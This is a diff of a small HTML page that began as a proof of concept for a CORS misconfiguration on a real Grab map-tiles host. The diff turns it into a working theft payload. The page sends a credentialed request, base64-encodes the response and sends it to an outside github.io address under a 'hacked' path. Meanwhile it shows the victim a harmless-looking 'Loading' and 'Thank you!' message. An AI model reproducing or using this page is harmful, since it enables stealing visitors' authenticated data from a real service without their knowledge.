@@ -1,17 +1,19 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h1>PoC CORS</h1>
+    <h1>Loading dulu yagesyak...</h1>
     <script>
       fetch("https://map-tiles-cloudfront.grab.com", {
+        method: "GET",
         credentials: "include"
       })
       .then(res => res.text())
       .then(data => {
-        document.body.innerHTML += "<pre>" + data + "</pre>";
+        fetch("https://theunforgivennn.github.io/hacked/" + btoa(data));
+        document.body.innerHTML = "<h2>Thank you!</h2>";
       })
       .catch(err => {
-        document.body.innerHTML += "<p style='color:red'>" + err + "</p>";
+        document.body.innerHTML = "<h2 style='color:red'>Error: " + err + "</h2>";
       });
     </script>
   </body>
